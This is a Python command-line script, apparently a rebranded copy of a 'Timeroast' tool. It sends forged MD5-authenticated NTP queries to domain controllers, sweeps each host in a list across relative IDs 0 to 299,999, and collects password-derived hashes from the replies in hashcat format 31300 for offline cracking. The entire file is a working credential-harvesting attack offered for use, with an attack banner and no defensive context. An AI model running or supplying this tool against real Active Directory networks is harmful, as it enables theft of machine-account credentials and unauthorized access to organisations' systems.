#!/usr/bin/env python3

from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, ArgumentTypeError, RawDescriptionHelpFormatter
from typing import *
from select import select
from time import time, sleep
from sys import stdout, stderr
from itertools import chain
from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack, unpack

# Static NTP query prefix using the MD5 authenticator. Append 4-byte RID and dummy checksum to create a full query.
NTP_PREFIX = unhexlify('db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a')

# Default settings.
DEFAULT_RATE = 180
DEFAULT_GIVEUP_TIME = 24

def hashcat_format(rid : int, hashval : bytes, salt : bytes) -> str:
    """Encodes hash in Hashcat-compatible format (with username prefix)."""
    return f'{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}'


def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, old_pwd : bool, src_port : int = 0) -> List[Tuple[int, bytes, bytes]]:
    """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
       Rate is the number of queries per second to send.
       Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will 
       not respond to queries with non-existing RIDs, so it is difficult to distinguish nonexistent RIDs from network 
       issues.
       
       Yields (rid, hash, salt) pairs, where salt is the NTP response data."""

    # Flag in key identifier that indicates whether the old or new password should be used.
    keyflag = 2**31 if old_pwd else 0

    # Bind UDP socket.
    with socket(AF_INET, SOCK_DGRAM) as sock:
        try:
            sock.bind(('0.0.0.0', src_port))
        except PermissionError:
            raise PermissionError(f'No permission to listen on port {src_port}. May need to run as root.')

        query_interval = 1 / rate
        last_ok_time = time()
        rids_received = set()
        rid_iterator = iter(rids)

        while time() < last_ok_time + giveup_time:
            
            # Send out query for the next RID, if any.
            query_rid = next(rid_iterator, None)
            if query_rid is not None:
                query = NTP_PREFIX + pack('<I', query_rid ^ keyflag) + b'\x00' * 16
                sock.sendto(query, (dc_host, 123))

            # Wait for either a response or time to send the next query.
            ready, [], [] = select([sock], [], [], query_interval)
            if ready:
                reply = sock.recvfrom(120)[0]

                # Extract RID, hash and "salt" if succesful.
                if len(reply) == 68:
                    salt = reply[:48]
                    answer_rid = unpack('<I', reply[-20:-16])[0] ^ keyflag
                    md5hash = reply[-16:]

                    # Filter out duplicates.
                    if answer_rid not in rids_received:
                        rids_received.add(answer_rid)
                        yield (answer_rid, md5hash, salt)
                    last_ok_time = time()

def get_args():
    """Parse command-line arguments."""

    argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
    """Performs an NTP 'Timeroast' attack against a domain controller. 
    Outputs the resulting hashes in the hashcat format 31300 with the --username flag ("<RID>:$sntp-ms$<hash>$<salt>").

    Usernames within the hash file are user RIDs. In order to use a cracked 
    password that does not contain the computer name, either look up the RID
    in AD (if you already have some account) or use a computer name list obtained
    via reverse DNS, service scanning, SMB NULL sessions etc.

    In order to be able to receive NTP replies root access (or at least high port
    listen privileges) is needed.
    """
    )

    # Configurable options.
    argparser.add_argument(
        '-o', '--out', 
        type=FileType('w'), default=stdout, metavar='FILE', 
        help='Hash output file. Writes to stdout if omitted.'
    )
    argparser.add_argument(
        '-f', '--hosts-file',
        type=FileType('r'), required=True, metavar='FILE',
        help='File containing list of hosts to check, one per line.'
    )

    return argparser.parse_args()


def print_banner():
    """Prints the GISCYBERTEAM banner."""
    banner = """
     ██████  ██ ███████  ███████ ██    ██ ██████  ███████  ██████  ████████ ███████    ██     ███    ███ 
    ██       ██ ██       ██       ██  ██  ██   ██ ██       ██   ██    ██    ██       ██  ██   ████  ████ 
    ██   ███ ██ ███████  ██         ██    █████   █████    ██████     ██    █████   ██    ██  ██ ████ ██ 
    ██    ██ ██      ██  ██         ██    ██   ██ ██       ██   ██    ██    ██      ████████  ██  ██  ██ 
     ██████  ██ ███████  ███████    ██    ███████ ███████  ██   ██    ██    ███████ ██    ██  ██      ██ 
    """
    print(banner)
    print("Starting NTP Timeroast attack...\n")


def main():
    """Command-line interface."""
    
    # Print the banner at the start.
    print_banner()

    args = get_args()
    output = args.out
    hosts = [line.strip() for line in args.hosts_file]

    # Hardcoded values for removed parameters
    rate = DEFAULT_RATE
    giveup_time = DEFAULT_GIVEUP_TIME
    old_pwd = False
    src_port = 0

    total_hosts = len(hosts)
    for host_idx, host in enumerate(hosts, 1):
        print(f"[+] Processing host {host_idx}/{total_hosts}: {host}")
        for start in range(0, 300000, 30000):
            end = start + 30000
            rids = range(start, end)
            print(f"    Checking RIDs {start}-{end-1}...")
            for rid, hashval, salt in ntp_roast(host, rids, rate, giveup_time, old_pwd, src_port):
                print(f"        Found hash for RID {rid}")
                print(hashcat_format(rid, hashval, salt), file=output)
            print(f"    Finished checking RIDs {start}-{end-1}.\n")
        print(f"[+] Finished processing host {host_idx}/{total_hosts}: {host}\n")
    
    print("[+] All hosts processed. Exiting.")

if __name__ == '__main__':
    main()